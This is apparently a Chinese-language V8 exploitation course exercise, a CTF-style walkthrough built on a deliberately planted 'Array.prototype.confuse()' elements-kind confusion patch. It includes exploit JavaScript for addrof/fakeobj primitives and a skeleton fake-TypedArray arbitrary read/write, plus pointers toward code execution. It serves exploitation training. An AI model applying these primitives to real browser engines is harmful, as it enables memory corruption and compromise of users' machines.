# 練習 C — TurboFan type confusion CTF 完整解

> **目標**：把 Part 4 的漏洞知識和 Part 3 的利用原語**串成一條完整的鏈**。從一個 CTF 風格的 challenge patch（人為植入的 type confusion）出發，走完「觸發 → OOB → addrof/fakeobj → 任意讀寫」的全流程。這是你第一次獨立解一題完整的 V8 pwn。

> **環境**：V8 15.3.0（candidate）、commit `ab2cad06`。本練習要你**套用一個 challenge patch 並重編 d8**。exploit 邏輯全部給出且經過人工推導；因為需要 patched build，**最終 exploit 執行結果標「未實測，理論預期」**，但每一步的原語都對應你在 Part 1/3 用現行 d8 驗證過的機制。

## 背景與動機

CTF 的 V8 pwn 題有兩大類（[Ch 37](./37-ctf-v8-challenges.md) 會系統整理）：

1. **Challenge patch 型**：出題者故意 patch V8，加一個明顯的漏洞原語（例如一個不檢查邊界的 `Array.prototype.oob`），你要用它打到任意讀寫。**這題屬於這類**——最適合第一次練，因為漏洞位置明確，你能專心練利用鏈。
2. **真實 n-day / type confusion 型**：給一個真實 bug 的 vulnerable 版本，你要自己觸發。難度高，Part 5 和 final 會碰。

這題模擬第一類，但植入的是一個 **type confusion 型**的原語（而非單純 OOB），逼你走完整的 addrof/fakeobj，而不是抄現成 OOB。

## 任務規格

**challenge patch**：在 V8 15.3.0（`ab2cad06`）上，於 `Array.prototype` 加一個內建 `fakeobj` 的相反——一個故意的 elements-kind 混淆原語。具體 patch（加到 `src/builtins/array-slice.tq` 或用 CSA 掛一個新內建；下方參考解附最小 patch 示意）：

- 新增 `Array.prototype.confuse()`：回傳 `this` 的一個「別名」，該別名的 elements kind 被強制標成 `PACKED_DOUBLE_ELEMENTS`，**但不改實際 backing store**。於是同一塊 elements，一個 view 當 object、一個 view 當 double。

| 項目 | 規格 |
|---|---|
| 輸入 | 你的 `exploit.js`，用 `d8 --allow-natives-syntax exploit.js` 執行 |
| 漏洞原語 | `arr.confuse()` 給你「同一 elements、雙重 elements-kind view」 |
| 要達成 | `addrof(obj)`、`fakeobj(addr)`、`read64(addr)`、`write64(addr, val)` 四個 helper |
| 驗收 | 用 `read64` 讀出一個已知物件的 map，值與 `%DebugPrint` 一致；`write64` 能改一個 double 陣列的 length 並被觀察到 |
| 禁止 | 不得依賴 `%DebugPrint` 洩漏位址（那是作弊；真實環境沒有）。`%DebugPrint` 只能用來**驗證**你的原語對不對 |

> 若你想用一個更簡單的純 OOB patch（不強制 type confusion），可回 [練習 B](./practice-b-oob-to-rw.md)；這題刻意要你練 elements-kind 混淆這條主流路。

## 期望輸出範例

```
[*] addrof(victim)   = 0x2c71010042f9
[*] fakeobj roundtrip: addrof(fakeobj(x)) == x  ✓
[*] read64(victim map addr) = 0x2c71010cfc9  (matches %DebugPrint)
[*] corrupted length = 0x1337
[+] arbitrary read/write established
```

（位址每次跑不同；重點是四個 helper 自洽、且與 `%DebugPrint` 交叉驗證一致。）

## 如果你卡住了

1. **先確認混淆原語本身**：`arr.confuse()` 後，對兩個 view 各 `%DebugPrint`，確認一個是 `PACKED_ELEMENTS`、一個是 `PACKED_DOUBLE_ELEMENTS`，且 elements 位址**相同**。混淆不成立，後面都白搭。
2. **addrof 拿到的是壓縮位址**：讀出來的 double 位元裡，只有低 32 bit 是有意義的壓縮指標（[Ch 4](./04-pointer-compression.md)）。別把整個 64-bit 當位址。
3. **fakeobj 前要先蓋好假物件**：在一個 double 陣列裡先擺好「假 Map 指標 + 假欄位」，`fakeobj` 才指得到有效物件（[Ch 16](./16-fake-object-rw.md)）。
4. **read64/write64 的穩定版靠 TypedArray**：用混淆做出第一個 OOB 後，最好的任意讀寫是偽造/破壞一個 TypedArray 的 backing store（[Ch 17](./17-typedarray-attack.md)），而非一直用 fake array。
5. **sandbox 開著時**：backing store 指標經 external pointer table 間接（[Ch 34](./34-v8-sandbox.md)），你的「任意讀寫」被限在 cage 內。這題的驗收只要求 cage 內讀寫，不要求打穿 sandbox。

## 實作步驟建議

### Step 1：驗證混淆原語
套 patch、重編、`arr.confuse()` 後對兩 view `%DebugPrint`，確認雙重 elements-kind + 同 elements 位址。

### Step 2：ftoi/itof 工具
用 `ArrayBuffer` + `Float64Array` + `BigUint64Array` 寫位元互轉（[Ch 15](./15-addrof-fakeobj.md)，這步可在現行 d8 真跑驗證）。

### Step 3：addrof
把 `victim` 放進 object view，用 double view 讀同一格 → 拿到 `victim` 的壓縮位址。

### Step 4：fakeobj
在一個 double 陣列 `container` 裡擺好假物件位元，用 object view 把 `container` 某格寫成指向假物件的指標 → 讀出來就是 fake object。

### Step 5：任意讀寫
用 addrof/fakeobj 偽造一個 `Float64Array`，其 backing store 指標可控 → 移動它做 read64/write64。

### Step 6：驗收
`read64` 一個已知物件的 map，對照 `%DebugPrint`；`write64` 改一個 double 陣列 length。

## 完整參考解答

**自己先走到 Step 4 再看！** 尤其 addrof/fakeobj 要親手推過位元。

<details>
<summary>點開 challenge patch 示意 + 參考 exploit.js</summary>

**challenge patch（最小示意，掛一個強制 elements-kind 混淆的內建）**：

```
# 在 src/builtins/ 加一個 CSA/Torque 內建 %ArrayConfuse，
# 回傳一個與 this 共享 elements、但 map 的 elements_kind 被改成
# PACKED_DOUBLE_ELEMENTS 的別名 JSArray。核心是「複製 map，改 elements_kind
# 位元，掛回同一個 elements FixedArray」。掛載到 Array.prototype.confuse。
# 重編： autoninja -C out/x64.release d8   （或 out/x64.release.nosbx）
```

（此 patch 屬 CTF 出題手法，非真實漏洞。目的是給你一個乾淨的 double↔object 混淆練利用。）

**exploit.js（利用邏輯完整；執行需上述 patched d8）**：

```js
// ---- Step 2: 位元互轉 ----
let ab = new ArrayBuffer(8);
let f64 = new Float64Array(ab);
let u64 = new BigUint64Array(ab);
function ftoi(f) { f64[0] = f; return u64[0]; }
function itof(i) { u64[0] = BigInt(i); return f64[0]; }

// ---- Step 3/4: 用混淆原語做 addrof / fakeobj ----
// obj_view：正常 object 陣列；dbl_view：同一 elements、被當 double
let obj_view = [{}, {}, {}, {}];
let dbl_view = obj_view.confuse();   // challenge 原語：共享 elements 的 double 別名

function addrof(o) {
  obj_view[0] = o;                   // 把物件指標寫進 elements[0]（object 語意）
  return ftoi(dbl_view[0]) & 0xffffffffn;  // 用 double 語意讀出 → 壓縮位址（低 32 bit）
}
function fakeobj(addr) {
  dbl_view[0] = itof(addr);          // 把位址當 double 寫進 elements[0]
  return obj_view[0];                // 用 object 語意讀出 → 指向 addr 的「物件」
}

// ---- Step 5: 用 addrof/fakeobj 偽造可控 backing store 的 TypedArray ----
// container 攜帶「假 TypedArray 的位元」；細節（假 map、欄位 offset）依 15.3 佈局
let container = [
  itof(0x0000000100000000n),  // 佔位：假 map / 欄位（實作時填真實 map 位址與欄位）
  itof(0x0n),
];
// 用 addrof 找到 container 的 elements，fakeobj 到「假 TypedArray 頭部」
// 之後改假 TypedArray 的 backing_store 欄位即可移動讀寫窗口
// （完整假物件佈局見 Ch 16/17；此處給骨架）

let fake_ta_addr = addrof(container) /* + 位移到 elements 內容 */;
let fake_ta = fakeobj(fake_ta_addr);

function read64(addr) {
  // 設定 fake_ta 的 backing store = addr，讀 fake_ta[0]
  // ...（依 Ch 17：寫入 fake_ta 的 external_pointer / backing_store 欄位）
  return /* 讀出的 64-bit */;
}
function write64(addr, val) {
  // 設定 fake_ta 的 backing store = addr，寫 fake_ta[0] = val
}

// ---- Step 6: 驗收 ----
let victim = {a: 1};
print("[*] addrof(victim) = 0x" + addrof(victim).toString(16));
// read64(victim 的位址) 應讀出它的 map，與 %DebugPrint(victim) 一致
```

**解答說明**：
- `addrof`/`fakeobj` 的核心就是**同一塊 elements、兩種 elements-kind 解讀**（[Ch 23](./23-element-kind-map-confusion.md)）：object view 寫指標、double view 讀位元 = addrof；反之 = fakeobj。
- 只取低 32 bit 是因為 pointer compression（[Ch 4](./04-pointer-compression.md)）。
- 穩定的 read64/write64 用**可控 backing store 的 fake TypedArray**（[Ch 17](./17-typedarray-attack.md)），比反覆 fakeobj 乾淨。
- 上面 Step 5 的假物件佈局（假 map、欄位 offset）留骨架——填法完全對應 [Ch 16](./16-fake-object-rw.md)/[Ch 17](./17-typedarray-attack.md)，你要用 `%DebugPrint` 抄出 15.3 的真實 TypedArray 佈局來填。這正是這題要練的手上功夫。

</details>

## 測試用例

| 測試 | 預期 | 說明 |
|---|---|---|
| `arr.confuse()` 後兩 view 的 elements 位址 | 相同 | 混淆成立的前提 |
| `addrof(victim)` vs `%DebugPrint(victim)` | 一致（低 32 bit） | addrof 正確性 |
| `addrof(fakeobj(x)) === x` | 成立 | 兩原語互逆 |
| `read64(map_addr)` | = `%DebugPrint` 的 map 值 | 任意讀正確 |
| `write64` 改 double 陣列 length 後 `arr.length` | 變成寫入值 | 任意寫正確 |
| 對 cage 外位址 read64（sandbox build） | 失敗/受限 | 印證 [Ch 34](./34-v8-sandbox.md) 的限制 |

## 延伸挑戰（加分）

1. **不用 challenge 原語**：把這題的 `confuse()` 換成你自己用 [Ch 21](./21-array-prototype-side-effect.md) 的 callback（`valueOf` 中途改 elements kind）製造的混淆——更接近真實 bug。
2. **穩定性**：讓你的 exploit 跑 100 次不 crash（處理 GC 搬動、位址重取）。
3. **no-sandbox 對照**：在 `out/x64.release.nosbx` 上把同一套原語打到「進程級任意讀寫」（直接改真實 backing store 指標），對比 sandbox build 的差異，寫成一頁筆記。
4. **接 code exec**：讀 [Ch 32](./32-arbitrary-rw-to-code-exec.md)，把任意讀寫接到控制流劫持（sandbox 開著時的難度見 Ch 32/36）。

## 自我檢核

- [ ] 能獨立寫出 `ftoi`/`itof` 並解釋為什麼 addrof 只取低 32 bit
- [ ] 能用 elements-kind 混淆做出 addrof 和 fakeobj，並用 `%DebugPrint` 交叉驗證
- [ ] 能解釋為什麼穩定的任意讀寫要用可控 backing store 的 TypedArray
- [ ] 能說出 sandbox build 對「任意讀寫範圍」的限制
- [ ] 能說出自己的實作和參考解的差異，並解釋各自取捨

把一題 type confusion 從觸發打到任意讀寫，你就跨過了 V8 pwn 最陡的一段學習曲線。接下來 Part 5 換一個身分：不再吃現成 bug，而是**自己找 bug**——從讀 V8 commit 與 patch diffing 開始。

→ [Ch 26 — 讀 V8 source 與 commit](./26-reading-v8-source-commits.md)
